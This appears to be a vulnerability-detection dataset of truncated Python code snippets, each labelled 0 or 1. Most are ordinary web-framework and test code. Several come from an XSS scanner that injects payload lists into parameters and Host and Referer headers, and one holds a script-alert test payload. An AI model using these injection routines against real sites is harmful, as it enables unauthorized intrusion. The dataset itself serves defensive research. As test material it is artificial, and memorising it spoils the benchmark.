name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'),", "label": 0}, {"snippet_id": 1888, "code": ") for payload in xss_payloads: temp_body.update(body) temp_body[key]=payload print \"updated body\",temp_body xss_post_request=req.api_request(url, \"POST\", headers, temp_body) decoded_payload=xss_payload_decode", "label": 0}, {"snippet_id": 47918, "code": "=int(request.POST[\"rights\"]) if not check_password_conformity(pw1, pw2): recreate_form('password mismatch') auth_user: User=User.objects.create_user(username=username, email=mail, password=pw1) auth_user", "label": 1}, {"snippet_id": 9734, "code": "'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', ", "label": 0}, {"snippet_id": 13047, "code": "'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$", "label": 0}, {"snippet_id": 11324, "code": "(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params)) sequence_url=\"/api/courses/v1/blocks/?{}\".format( urlencode({ \"course_id\": self.course_key, \"depth\": \"all", "label": 0}, {"snippet_id": 24023, "code": "--no-color --process-timeout=1200\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', procs=process_count ) ) suite=BokChoyTestSuite('', num_processes=process_count) self", "label": 0}, {"snippet_id": 4052, "code": "!=-1: impact=check_xss_impact(xss_request_url.headers) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body", "label": 0}, {"snippet_id": 9814, "code": "/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth", "label": 0}, {"snippet_id": 51577, "code": " WSGI_APPLICATION='dashboard.wsgi.application' DATABASE_OPTIONS={ 'mysql':{'init_command': \"SET character_set_connection=utf8,\" \"collation_connection=utf8_unicode_ci,\" \"sql_mode='STRICT_ALL_TABLES';\"}, ", "label": 0}, {"snippet_id": 40311, "code": " and(df.get(\"ignore_xss_filter\") \t\t\t\t\t\tor(df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\") \t\t\t\t\t\tor df.get(\"fieldtype\") in(\"Attach\", \"Attach Image\") \t\t\t\t\t\t \t\t\t\t\t\tor self.docstatus==2 \t\t\t\t\t\tor", "label": 1}, {"snippet_id": 9408, "code": " 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service", "label": 0}, {"snippet_id": 31071, "code": "+script+\" BACKUP \"+interface+\" \"+vrrpip]) \t\t\t \tos.system(\"rm -f %s\" % script) \tsql.update_server_master(master, slave) \t if form.getvalue('masteradd'): \tmaster=form.getvalue('masteradd') \tslave=form.getvalue", "label": 0}, {"snippet_id": 32201, "code": " import os import re import socket import sys import threading import time import webbrowser from xml.etree import ElementTree THIS_DIR=os.path.realpath(os.path.dirname(__file__)) SRC_DIR=os.path.dirname(os", "label": 0}, {"snippet_id": 51456, "code": ".contenttypes', 'django.contrib.sessions', 'django.contrib.messages', 'django.contrib.staticfiles', 'django.contrib.humanize', 'django_celery_beat', 'compressor', 'websecmap.app', 'websecmap.organizations', ", "label": 0}, {"snippet_id": 544, "code": "' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): if res_headers['Content-Type']: if 'application/json' or 'text/plain", "label": 1}, {"snippet_id": 10374, "code": " expected_verbosity_string) def test_verbosity_settings_3_processes(self): \"\"\" With the above test, validate that num_processes can be set to various values \"\"\" process_count=3 expected_verbosity_string=( \"--with-xunitmp", "label": 0}, {"snippet_id": 9790, "code": "/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider", "label": 0}, {"snippet_id": 50302, "code": " uid: sess.uid=uid sess.logged_in=True sess.sessionhandler.connect(sess) self.last_alive[csessid]=(time.time(), False) if not self.keep_alive: self.keep_alive=LoopingCall(self._keepalive) self.keep_alive", "label": 0}, {"snippet_id": 28102, "code": " import os import http.cookies import funct import sql from jinja2 import Environment, FileSystemLoader env=Environment(loader=FileSystemLoader('templates/')) template=env.get_template('config.html') print", "label": 1}, {"snippet_id": 10629, "code": "\" TestSuite for running Bok Choy tests Properties(below is a subset): test_dir -parent directory for tests log_dir -directory for test output report_dir -directory for reports(e.g., coverage) related to", "label": 0}, {"snippet_id": 46301, "code": ", 'query': query, 'initial': json.dumps({ 'autoLoad': True, 'collections': collections, 'layout':[ {\"size\":12,\"rows\":[{\"widgets\":[ {\"size\":12,\"name\":\"Grid Results\",\"id\":\"52f07188-f30f-1296-2450-f77e02e1a5c0", "label": 0}, {"snippet_id": 13189, "code": ".password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>[0-9A", "label": 0}, {"snippet_id": 53763, "code": "='The name of the application') parser.add_argument('--region', type=str, required=True, help='The default application region') args=parser.parse_args() write_eb_config(args.dest, application_name=args", "label": 0}, {"snippet_id": 17854, "code": " kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/", "label": 0}, {"snippet_id": 49661, "code": "\"\" if not self.list_display: return[SmartColumn(self.model, '__str__', 1, self.ordering_query_value, self.ordering_query_param)] columns=[] for index, field in enumerate(self.list_display, start=1): kwargs", "label": 0}, {"snippet_id": 10624, "code": " DEFAULT_VERBOSITY=2 class BokChoyTestSuite(TestSuite): \"\"\" TestSuite for running Bok Choy tests Properties(below is a subset): test_dir -parent directory for tests log_dir -directory for test output report_dir", "label": 0}, {"snippet_id": 6730, "code": " code to use when looking for web pages('en'). \"\"\" return self.config.get(self.section, 'default_language') @property def base_url(self): \"\"\" Base URL of the IdP. The default base URL is constructed from", "label": 0}, {"snippet_id": 32134, "code": " \"\"\"Naive case-insensitive search.\"\"\" q=filter_string.lower() return[mapping for mapping in mappings if q in mapping.ud.lower()] def get_rules_as_json(mapping): rules=getattr(mapping, 'rules', None) if", "label": 0}, {"snippet_id": 42375, "code": " get_table_field_doctype(self, fieldname): \t\treturn self.meta.get_field(fieldname).options \tdef get_parentfield_of_doctype(self, doctype): \t\tfieldname=[df.fieldname for df in self.meta.get_table_fields(", "label": 0}, {"snippet_id": 38664, "code": " \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype\")) \t\tfor key, value in iteritems(d): \t\t\t \t\t\tif(self.get(key) is None) and(value is not None) and(key not in self.dont_update_if_missing): \t\t\t", "label": 0}, {"snippet_id": 25312, "code": " dict()) if 'required' in final_attrs: del final_attrs['required'] id_=final_attrs.get('id', None) for i, widget in enumerate(self.widgets): try: widget_value=value[i] except(IndexError, TypeError): widget_value", "label": 0}, {"snippet_id": 38383, "code": "=1) \tfor post in posts: \t\tpost.cover_image=find_first_image(post.content) \t\tpost.published=global_date_format(post.creation) \t\tpost.content=strip_html_tags(post.content[:340]) \t\tif not post.comments: \t", "label": 0}, {"snippet_id": 15271, "code": " number of available processors. verify_xss -when set, check for XSS vulnerabilities in the page HTML. See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html \"\"\" def __init__(self, ", "label": 0}, {"snippet_id": 23131, "code": ".take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$', 'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>", "label": 0}, {"snippet_id": 9979, "code": "/test_paver_bok_choy_cmds.py \"\"\" import os import unittest from mock import patch, call from test.test_support import EnvironmentVarGuard from paver.easy import BuildFailure from pavelib.utils.test.suites", "label": 0}, {"snippet_id": 12898, "code": "'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'),", "label": 0}, {"snippet_id": 21374, "code": "/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name", "label": 1}, {"snippet_id": 47469, "code": "['fault']))) current_user: Profile=get_current_user(http_request) if current_user.rights > 3: if not profile: f.add_content(CheckBox(name=\"active\", text=\"User Active\", checked=CheckEnum.CHECKED)) else:", "label": 0}, {"snippet_id": 30520, "code": " serv is not None and form.getvalue('rows1') is not None: \trows=form.getvalue('rows1') \tgrep=form.getvalue('grep') \thour=form.getvalue('hour') \tminut=form.getvalue('minut') \thour1=form.getvalue('hour1') ", "label": 0}, {"snippet_id": 559, "code": " res_headers['Content-Type']: if 'application/json' or 'text/plain' in xss_request['Content-Type']: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_get_url(url,method,headers,body,scanid", "label": 1}, {"snippet_id": 39086, "code": "], list) and df.fieldtype !='Table': \t\t\t\t\tfrappe.throw(_('Value for{0} cannot be a list').format(_(df.label))) \t\t\t\tif convert_dates_to_str and isinstance(d[fieldname],(datetime.datetime, datetime.time,", "label": 0}, {"snippet_id": 12466, "code": "), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'), url(r'^courses/(?P<course_id>[^/]", "label": 0}, {"snippet_id": 43868, "code": "('parent_doc'): \t\t\t\t\tself.parent_doc.get_latest() \t\t\t\t\tref_doc=[d for d in self.parent_doc.get(self.parentfield) if d.name==self.name][0] \t\t\t\telse: \t\t\t\t\tref_doc=self.get_latest() \t\t\tfor df in to_reset:", "label": 0}, {"snippet_id": 24591, "code": " SKIPPING database cleanup.') print msg else: msg=colorize('green', \"Cleaning up databases...\") print msg sh(\"./manage.py lms --settings bok_choy flush --traceback --noinput\") bokchoy_utils.clear_mongo(", "label": 0}, {"snippet_id": 54161, "code": ".configure(background='light sky blue') Label(main, text=\"Target:\",background='light sky blue').grid(row=0) Label(main, text=\"Cookie:(Optional)\",background='light sky blue').grid(row=1) Label(main, text=\"Method", "label": 0}, {"snippet_id": 47386, "code": "=user_id) f=Form() f.action_url=action_url if profile: f.add_content(PlainText('<h3>Edit user \"' +profile.authuser.username +'\"</h3>')) f.add_content(PlainText('<a href=\"/admin/media/select?action_url=/admin", "label": 0}, {"snippet_id": 23164, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]", "label": 0}, {"snippet_id": 2389, "code": ",headers,body,scanid): if method=='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid) if method=='POST' or method=='PUT': xss_post_method(url", "label": 0}, {"snippet_id": 33138, "code": "( 'https://chromium.googlesource.com/infra/infra/+/master/' 'appengine/cr-buildbucket/README.md' ) class MainHandler(webapp2.RequestHandler): \"\"\"Redirects to README.md.\"\"\" def get(self): return self.redirect", "label": 0}, {"snippet_id": 39604, "code": " _(df.label)) \t\t\telif self.parentfield: \t\t\t\treturn \"{}:{}{} \t\t\t\t\t_(\"Row\"), self.idx, _(\"Value missing for\"), _(df.label)) \t\t\telse: \t\t\t\treturn _(\"Error: Value missing for{0}:{1}\").format(_(df.parent), _", "label": 0}, {"snippet_id": 12297, "code": "'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"", "label": 0}, {"snippet_id": 16566, "code": "', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+", "label": 0}, {"snippet_id": 40333, "code": " df.get(\"allow_on_submit\"))): \t\t\t\tcontinue \t\t\telse: \t\t\t\tsanitized_value=sanitize_html(value, linkify=df.fieldtype=='Text Editor') \t\t\tself.set(fieldname, sanitized_value) \tdef _save_passwords(self): \t\t'", "label": 0}, {"snippet_id": 14737, "code": " suite=BokChoyTestSuite('', test_spec=spec, default_store='draft') name='tests/{}'.format(spec) self.assertEqual( suite.cmd, self._expected_command(name=name, store='draft') ) def test_invalid_default_store", "label": 0}, {"snippet_id": 780, "code": "\"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result,db_update", "label": 0}, {"snippet_id": 5433, "code": "'onmouseleave', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onmousewheel', 'onoffline', 'ononline', 'onorientationchange', 'onpagehide', 'onpageshow', 'onpaste', 'onpause', 'onplay', 'onplaying", "label": 0}, {"snippet_id": 10660, "code": " various set-up tasks(e.g., collectstatic) serversonly -prepare and run the necessary servers, only stopping when interrupted with Ctrl-C testsonly -assume servers are running(as per above) and run tests", "label": 0}, {"snippet_id": 3933, "code": "?test='+payload referer_header={\"Referer\": referer_header_value} temp_headers.update(referer_header) ref_header_xss=req.api_request(url, \"GET\", temp_headers) decoded_payload=xss_payload_decode(payload) if", "label": 1}, {"snippet_id": 11309, "code": ".start_urls=[] auto_auth_params={ \"redirect\": 'true', \"staff\": 'true', \"course_id\": self.course_key, } cms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\"", "label": 0}, {"snippet_id": 11308, "code": " self.start_urls=[] auto_auth_params={ \"redirect\": 'true', \"staff\": 'true', \"course_id\": self.course_key, } cms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?", "label": 0}, {"snippet_id": 247, "code": ".insert_record(attack_result) except: logs.logging.info(\"XSS: No GET param found!\") def xss_check(url,method,headers,body,scanid): xss_payloads=fetch_xss_payload() xss_get_method(url,method,headers,body,scanid)", "label": 1}, {"snippet_id": 22089, "code": "', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager", "label": 0}, {"snippet_id": 42779, "code": "._dict(label=fieldname)))) \t\treturn missing \tdef get_invalid_links(self, is_submittable=False): \t\t'''Returns list of invalid links and also updates fetch values if not set''' \t\tdef get_msg(df, docname):", "label": 0}, {"snippet_id": 37189, "code": ".get_value('Blog Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar and(not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post.avatar.startswith(\"/\")", "label": 0}, {"snippet_id": 45164, "code": " workflows=[dict([('uuid', d.content_object.uuid),('name', d.content_object.name)]) for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')] if coordinator_id and not filter(lambda a", "label": 0}, {"snippet_id": 7971, "code": "(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort", "label": 0}, {"snippet_id": 33774, "code": "(\"Blogger\",{\"name\": frappe.local.form_dict.blogger}, \"full_name\") \t\tlist_context.sub_title=_(\"Posts by{0}\").format(blogger) \t\tlist_context.title=blogger \telif frappe.local.form_dict.txt: \t\tlist_context", "label": 1}, {"snippet_id": 9841, "code": ", 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^", "label": 0}, {"snippet_id": 5123, "code": "\" super(XSS, self).__init__() self.url=url @classmethod def alterTest(cls, p=False): return \"<script>alert(/xss/)</script>\" @classmethod def genTestHTML(cls): s='' for t in cls.tags: s +='<%s src=\"x\"' ", "label": 0}, {"snippet_id": 28624, "code": "=channel_name, text=mess) \texcept: \t\tprint(\"Fatal: Can't send message. Add Telegram chanel before use alerting at this servers group\") \t\tsys.exit() \t def check_login(**kwargs): \timport sql \timport http", "label": 0}, {"snippet_id": 8401, "code": " urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views", "label": 0}, {"snippet_id": 50078, "code": " _responseFailed(self, failure, csessid, request): \"callback if a request is lost/timed out\" try: del self.requests[csessid] except KeyError: pass def _keepalive(self): \"\"\" Callback for checking the connection", "label": 0}, {"snippet_id": 42768, "code": "\"parenttype\"): \t\t\t\tif not self.get(fieldname): \t\t\t\t\tmissing.append((fieldname, get_msg(frappe._dict(label=fieldname)))) \t\treturn missing \tdef get_invalid_links(self, is_submittable=False): \t\t'''Returns list", "label": 0}, {"snippet_id": 54949, "code": ") for project in projects: project.aggregate_stats() ProjectLocale.objects.get(locale=locale, project=project).aggregate_stats() def mark_changed_translation(changed_entities, locale): \"\"\"Mark entities", "label": 0}, {"snippet_id": 11787, "code": "\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url", "label": 0}, {"snippet_id": 21421, "code": "/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section", "label": 0}, {"snippet_id": 49871, "code": "=request.form[\"message\"].replace('img', 'uwu').replace('location', 'owo').replace('script', 'uwu') responses=[ \"send help\", \"what is my purpose\", \"donate to us via bitcoin at:{{ bitcoin_address}}\", \"donate to", "label": 1}, {"snippet_id": 30055, "code": " in config</div>') \telse: \t\tprint('<div class=\"alert alert-success\">SSL file was upload to %s into: %s </div>' %(serv, cert_path)) \t\t \tMASTERS=sql.is_master(serv) \tfor master in MASTERS: \t\tif master[0] ", "label": 0}, {"snippet_id": 9081, "code": "<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P", "label": 0}, {"snippet_id": 50551, "code": " request. It uses a long-polling mechanism to avoid sending data unless there is actual data available. Args: request(Request): Incoming request. \"\"\" dmode=request.args.get('mode',[None])[0] if dmode=='init", "label": 0}, {"snippet_id": 3234, "code": " temp_headers.update(headers) xss_payloads=fetch_xss_payload() for payload in xss_payloads: parse_domain=urlparse.urlparse(url).netloc host_header={\"Host\": parse_domain +'/' +payload} headers.update(host_header)", "label": 0}, {"snippet_id": 31295, "code": "] \t\tp[serv]={} \t\tmetric=sql.select_metrics(serv) \t\tmetrics={} \t\t \t\tfor i in metric: \t\t\trep_date=str(i[5]) \t\t\tmetrics[rep_date]={} \t\t\tmetrics[rep_date]['server']=str(i[0]) \t\t\tmetrics[rep_date]['curr_con", "label": 0}, {"snippet_id": 36907, "code": "\tlist_context.sub_title=_('Filtered by \"{0}\"').format(frappe.local.form_dict.txt) \tif list_context.sub_title: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}, \t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\":", "label": 1}, {"snippet_id": 22768, "code": ", 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+", "label": 1}, {"snippet_id": 8662, "code": ".password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls')), ", "label": 0}, {"snippet_id": 29530, "code": " line in stdout: \t\tif \"Ncat: \" not in line: \t\t\tfor k in line: \t\t\t\tproc_count=k.split(\":\")[1] \t\telse: \t\t\tproc_count=0 \treturn proc_count\t\t def ssh_command(serv, commands, **kwargs): \tssh=ssh_connect(serv) ", "label": 0}, {"snippet_id": 16083, "code": "\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=", "label": 0}, {"snippet_id": 49246, "code": ".ordering_query_param: \".\".join(new_query) }) class SmartColumn(TitleFromModelFieldMixin, object): def __init__(self, model, field, column_id, query_params, ordering_query_param, label=None, render_function=None", "label": 0}, {"snippet_id": 48575, "code": ": int=int(request.GET[\"srid\"]) sr: SubReservation=None if srid==0: sr=SubReservation() else: sr=SubReservation.objects.get(id=srid) if request.POST.get(\"notes\"): sr.notes=request.POST[\"notes\"] else: sr", "label": 1}, {"snippet_id": 8328, "code": "<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate", "label": 0}, {"snippet_id": 41574, "code": " import set_new_name from frappe.model.utils.link_count import notify_link_count from frappe.modules import load_doctype_module from frappe.model import display_fieldtypes from frappe.model.db_schema import", "label": 0}, {"snippet_id": 43829, "code": " at permlevel > 0, then reset the values to original / default\"\"\" \t\tto_reset=[] \t\tfor df in high_permlevel_fields: \t\t\tif df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes: \t\t", "label": 0}, {"snippet_id": 55054, "code": " Arguments to this view are defined in `models.BatchActionsForm`. \"\"\" form=forms.BatchActionsForm(request.POST) if not form.is_valid(): return HttpResponseBadRequest(form.errors.as_json()) locale=get_object_or_404", "label": 1}, {"snippet_id": 23796, "code": "'', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_class_spec(self): spec='test_foo.py:FooTest' suite=BokChoyTestSuite('', test_spec", "label": 0}, {"snippet_id": 41374, "code": " % frappe.db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category)) \tif txt: \t\tconditions.append('(t1.content like ", "label": 0}, {"snippet_id": 18557, "code": "[^/]+)/open_ended_flagged_problems$', 'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$", "label": 0}, {"snippet_id": 5450, "code": "'onratechange', 'onreset', 'onresize', 'onscroll', 'onsearch', 'onseeked', 'onseeking', 'onselect', 'onselectionchange', 'onselectstart', 'onstalled', 'onstorage', 'onsubmit', 'onsuspend', 'ontimeupdate", "label": 0}, {"snippet_id": 53786, "code": ")) req=url.PoolManager() for page in range(4): send=req.request(\"GET\", \"http://www1.search-results.com/web?q=\" +user_dork +\"&page=\" +str(page)) parser=BeautifulSoup(send.data, features=\"lxml\") for link", "label": 1}, {"snippet_id": 22130, "code": ".urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=(''", "label": 0}, {"snippet_id": 53226, "code": " parameters])) params_form=ParametersFormSet(initial=initial_params) popup=render('editor/submit_job_popup.mako', request,{ 'params_form': params_form, 'action': reverse('oozie:editor_submit_coordinator", "label": 0}, {"snippet_id": 35495, "code": " fields_to_fetch: \t\t\t\t\t\tif self.is_new() or self.docstatus !=1 or _df.allow_on_submit: \t\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]]) \t\t\t\t\tnotify_link_count(doctype, docname) \t", "label": 0}, {"snippet_id": 23924, "code": " name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_test_dir(self): test_dir='foo' suite=BokChoyTestSuite('', test_dir=test_dir) self.assertEqual( suite", "label": 0}, {"snippet_id": 47449, "code": ".get('fault') and profile: f.add_content(PlainText(\"Unable to edit user due to: \" +str(http_request.GET['fault']))) elif http_request.GET.get('fault'): f.add_content(PlainText(\"Unable to add user due to:", "label": 0}, {"snippet_id": 16965, "code": "'staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]", "label": 0}, {"snippet_id": 10667, "code": " and run the necessary servers, only stopping when interrupted with Ctrl-C testsonly -assume servers are running(as per above) and run tests with no setup or cleaning of environment test_spec -when set", "label": 0}, {"snippet_id": 21707, "code": "?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes')", "label": 0}, {"snippet_id": 49485, "code": " elif self.model_field.choices: values=[ SmartFilterValue(self.field_name, choice[1], choice[0], self.query_params) for choice in self.model_field.choices ] elif type(self.model_field)==BooleanField: values", "label": 0}, {"snippet_id": 17547, "code": "', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404='static_template_view.views.render_404", "label": 0}, {"snippet_id": 50042, "code": " super(LazyEncoder, self).default(obj) def jsonify(obj): return utils.to_str(json.dumps(obj, ensure_ascii=False, cls=LazyEncoder)) class AjaxWebClient(resource.Resource): \"\"\" An ajax/comet long-polling", "label": 0}, {"snippet_id": 4025, "code": "(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url for payload in xss_payloads: xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) if result is not True", "label": 0}, {"snippet_id": 43900, "code": "=self.meta.get_field(fieldname) \t\tval=self.get(fieldname) \t\treturn self.cast(val, df) \tdef cast(self, value, df): \t\treturn cast_fieldtype(df.fieldtype, value) \tdef _extract_images_from_text_editor(self): ", "label": 0}, {"snippet_id": 23350, "code": "),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns", "label": 0}, {"snippet_id": 24138, "code": ") self.addCleanup(mock_sh.stop) def _expected_command(self, report_dir, start_urls): \"\"\" Returns the expected command to run pa11ycrawler. \"\"\" expected_statement=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler", "label": 0}, {"snippet_id": 38074, "code": "=None): \tlist_context=frappe._dict( \t\ttemplate=\"templates/includes/blog/blog.html\", \t\tget_list=get_blog_list, \t\thide_filters=True, \t\tchildren=get_children(), \t\t \t\ttitle=_('Blog') \t) \tcategory=frappe.local", "label": 1}, {"snippet_id": 20375, "code": "-course loaded, and runs pa11ycralwer against it. \"\"\" def __init__(self, *args, **kwargs): super(Pa11yCrawler, self).__init__(*args, **kwargs) self.course_key=kwargs.get('course_key') if self.imports_dir:", "label": 0}, {"snippet_id": 3178, "code": " scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record", "label": 0}, {"snippet_id": 9889, "code": ".view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS')", "label": 0}, {"snippet_id": 20350, "code": ".verbosity_processes_string()) ] if self.pdb: cmd.append(\"--pdb\") if self.save_screenshots: cmd.append(\"--with-save-baseline\") cmd.append(self.extra_args) cmd=(\" \").join(cmd) return cmd class Pa11yCrawler(BokChoyTestSuite): \"\"\"", "label": 0}, {"snippet_id": 10158, "code": "): spec='test_foo.py:FooTest.test_bar' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_spec_with_draft_default_store", "label": 0}, {"snippet_id": 492, "code": " \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) except: logs.logging.info(\"XSS: No GET param found!\") def xss_check(url,method,headers,body,scanid", "label": 0}, {"snippet_id": 54213, "code": "=\"Payload:\",background='light sky blue').grid(row=5) Label(main, text=\"HTTP Proxy:\",background='light sky blue').grid(row=6) Label(main, text=\"Refresh:\",background='light sky 